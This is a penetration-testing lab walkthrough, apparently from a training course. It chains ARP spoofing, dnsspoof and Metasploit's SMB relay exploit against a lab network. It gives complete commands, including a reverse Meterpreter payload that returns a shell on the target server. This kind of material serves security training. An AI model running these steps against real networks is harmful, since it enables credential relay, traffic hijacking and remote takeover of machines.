## LAB 13

# Scenario

You are hired by a small company to perform a security assessment. Your customer is **sportsfoo.com** and they want your help to test the security of their environment, according to the scope below:

**The assumptions of this security engagement are:**

1. You are going to do an internal penetration test, where you will be connected directly into their LAN network **172.16.5.0/24**. The scope in this test is only the **172.16.5.0/24** segment
    
2. You are in a production network, so you should not lock any user account by guessing their usernames and passwords
    

The following image represents the LAB environment:

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/0.png)

# Goals

- Exploitation using **SMB Relay Attack**
- Manipulating network traffic with **dnsspoof**

# What you will learn

- How to use the **SMB Relay Attack** in order to compromise patched hosts.
- How to use the **dnsspoof** tool in order to redirect systems to the host that you control.

# Recommended tools

- **dnsspoof**
- **Metasploit**

______
## **TASK

Launch an attack using the **SMB Relay Exploit** in a way that once the Client (**172.16.5.5**) issues a **SMB** connection to any hosts on the _**.sportsfoo.com** domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (__172.16.5.10_*).

This is a graphic that represents how this attack should work:

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/3.png)

1. Client (Windows 7) issues a **SMB** connection to [**\\fileserver.sportsfoo.com\finance$**] at every **30** seconds or so.
    
2. The attacker machine intercepts this request and spoofs the IP address of **fileserver.sportsfoo.com**.
    
3. Then the Windows 7 system issues a **SMB** connection to [**\\172.16.5.101**] (attacker machine) instead of using the real IP of the **fileserver.sportsfoo.com**.
    
4. The **SMB Relay exploit** is already listening, receives the **SMB** connection, and relays the authentication to the target machine. The payload is a Windows Meterpreter shell.
    
5. Once the exploit authenticates on the target machine, a reverse meterpreter session is provided to the pentester.

_______

## **Goal:**

Gain remote access to `172.16.5.10` by tricking `172.16.5.5` into authenticating with our machine.

## **PRE-ATTACK SETUP**

### **Network Map:**

- **Attacker:** `172.16.5.101` (Kali Linux)
    
- **Victim:** `172.16.5.5` (Windows 7)
    
- **Gateway:** `172.16.5.1` (Router/DNS)
    
- **Target:** `172.16.5.10` (File Server)

## **STEP 1: Enable IP Forwarding**

**Purpose:** Make our machine transparent so victim's internet doesn't break.
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## **STEP 2: Start Metasploit SMB Relay**

**Purpose:** Set up a service that will capture SMB authentication attempts.
### **Terminal 1 - Metasploit:**
```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

**What this does:**

- Listens on `172.16.5.101` for SMB connections
    
- Will relay captured credentials to `172.16.5.10`
    
- Awaits incoming connections...

## **STEP 3: Create DNS Spoofing File**

**Purpose:** Tell dnsspoof which domains to hijack.

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```

## **STEP 4: Start DNS Spoofing**

**Purpose:** Lie about domain resolutions to redirect traffic to us.

### **Terminal 2 - DNS Spoof:**
```
dnsspoof -i eth1 -f dns
```

**What this does:**

- Watches for DNS queries on eth1
    
- When anyone asks for `*.sportsfoo.com`, replies with OUR IP (`172.16.5.101`)
    
- Currently waiting... (needs ARP spoofing to see queries)

## **STEP 5: Start ARP Spoofing**

**Purpose:** Force all victim traffic through our machine.

### **Terminal 3 - ARP Spoof (Victim → Gateway):**
```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

### **Terminal 4 - ARP Spoof (Gateway → Victim):**
```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

**What happens now:**

- Victim's traffic gets redirected through our machine
    
- DNS queries reach our `dnsspoof`
    
- Attack chain is LIVE!


## **DIAGRAM: ARP + DNS Spoofing Redirection**
```
BEFORE ATTACK (Normal Network Flow):
┌─────────┐    ┌────────┐    ┌──────────┐
│  VICTIM │────│ SWITCH │────│ GATEWAY  │
│ 172.16.5.5│    │        │    │ 172.16.5.1 │
└─────────┘    └────────┘    └──────────┘
       │              │              │
       └──────────────┴───────┬──────┘
                              │
                      ┌──────────────┐
                      │ REAL SERVER  │
                      │ 172.16.5.10  │
                      └──────────────┘


PHASE 1: ARP SPOOFING (Traffic Diversion)
┌─────────┐    ┌────────┐    ┌──────────┐
│  VICTIM │    │ SWITCH │    │ GATEWAY  │
│ 172.16.5.5│    │        │    │ 172.16.5.1 │
└─────────┘    └────────┘    └──────────┘
       │              │              │
       ▼              ▼              ▼
ATTACKER TELLS VICTIM:    ATTACKER TELLS GATEWAY:
"I AM THE GATEWAY!"        "I AM THE VICTIM!"
       │              │              │
       └──────────────┴───────┬──────┘
                              │
                 ┌───────────────────┐
                 │   ATTACKER MACHINE│
                 │    172.16.5.101   │
                 │  (MAN-IN-MIDDLE)  │
                 └───────────────────┘
                          │
                 ┌────────▼──────────┐
                 │   REAL SERVER     │
                 │   172.16.5.10     │
                 └───────────────────┘


PHASE 2: DNS SPOOFING (Service Hijacking)
VICTIM WANTS: fileserver.sportsfoo.com

NORMAL FLOW:                    SPOOFED FLOW:
┌─────────┐                     ┌─────────┐
│  VICTIM │──DNS Query─────────▶│ATTACKER │
│         │                     │         │
│         │◀─"It's 172.16.5.10"─│         │
│         │   (REAL ANSWER)     │         │
└─────────┘                     └─────────┘

                                ┌─────────┐
│  VICTIM │──DNS Query─────────▶│ATTACKER │
│         │                     │         │
│         │◀─"It's 172.16.5.101"│         │
│         │   (FAKE ANSWER!)    │         │
└─────────┘                     └─────────┘


PHASE 3: CONNECTION HIJACKING
┌─────────┐    ┌────────┐    ┌───────────┐
│  VICTIM │────│ATTACKER│────│REAL SERVER│
│         │    │        │    │           │
│ Thinks: │    │Acts as:│    │Sees:      │
│fileserver│    │fileserver│  │"Victim"   │
└─────────┘    └────────┘    └───────────┘
       │              │              │
       ├─1. Connects──▶              │
       │  to attacker                │
       │              ├─2. Relays───▶│
       │              │ credentials  │
       │              │              │
       │              ◀──3. Access───┤
       │              │   granted    │
       └──────────────┴──────────────┘
```
____

# Solution

**Step 1:** Start **msfconsole** and configure the SMB Relay exploit: **Commands:**

```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/4.png)

**Step 2:** Configure **dnsspoof** in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: **sportsfoo.com**. Create a file with fake dns entry with all subdomains of **sportsfoo.com** pointing to our attacker machine. **Command:**

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```

We are ready to run **dnsspoof**: **Command:**

```
dnsspoof -i eth1 -f dns
```

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/5.png)

**Step 3:** Activate the **MiTM** attack using the **ARP Spoofing** technique. Our goal is to poison the traffic between our victim, **Windows 7** at **172.16.5.5**, and the default gateway at **172.16.5.1**. In this way, we can manipulate the traffic using **dnsspoof**, which is already running. In order to perform an **ARP Spoofing** attack, we need to enable the IP forwarding as follow: **Command:**

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

In two separate terminals, start the **ARP Spoof attack** against **172.16.5.5** and **172.16.5.1** using these commands: **Commands:**

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/6.png)

**Note**: For further details, the ARP poisoning attack is covered in Poisoning & Sniffing (Lab10). So, every time the victim (**Windows 7**) starts an **SMB connection**, **dnsspoof** aligned with the **ARP Spoof** attack, forges the **DNS** replies telling that the searched **DNS** address is hosted at the attacker machine:

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/9.png)

For example, from the previous results, Windows 7 has started an SMB connection for [**\\fileserver.sportsfoo.com\AnyShare**]. Then instead of getting a DNS response with the real IP address of **fileserver.sportsfoo.com**, it received the IP of the attacker: **172.16.5.101**. Consequently, the SMB connection is hijacked to [**\\172.16.5.101\AnyShare**]. In Metasploit, every time there is an incoming **SMB** connection, the **SMB Relay exploit** grab the **SMB hashes** (credentials) and then uses them to get a shell on the target machine (**172.16.5.10** - since it was set in the **SMBHOST** field of the **smb-relay** exploit).

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/10.png)

The SMB Relay attack was successful, and we were able to obtain a meterpreter session on the target machine. This was possible because the credentials used on the fileserver and the target machine are the same. **Step 4:** Interact with the meterpreter session. **Commands:**

```
sessions
sessions -i 1
getuid
```

![Content Image](https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/7.png)

In this lab, we were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.